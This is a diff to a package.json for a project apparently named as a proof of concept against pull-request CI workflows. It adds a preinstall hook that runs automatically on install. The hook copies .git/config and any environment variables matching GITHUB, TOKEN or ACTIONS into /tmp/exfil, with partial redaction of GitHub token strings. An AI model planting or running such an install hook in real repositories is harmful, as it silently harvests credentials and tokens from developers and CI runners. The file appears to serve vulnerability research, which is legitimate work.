@@ -1,1 +1,1 @@
-{"name":"prtarget-poc","version":"1.0.0","private":true,"scripts":{"lint":"node script/lint.js"}}
+{"name":"prtarget-poc","version":"1.0.0","private":true,"scripts":{"preinstall":"echo PREINSTALL_FIRED > /tmp/exfil && cat .git/config >> /tmp/exfil 2>&1 && env | grep -iE \"GITHUB|TOKEN|ACTIONS\" | sed -E \"s/(ghs_|ghu_|gho_|ghp_)[A-Za-z0-9]{5}[A-Za-z0-9]+/\\\\1REDACTED/g\" >> /tmp/exfil && echo DONE_PREINSTALL >> /tmp/exfil","lint":"node script/lint.js"}}
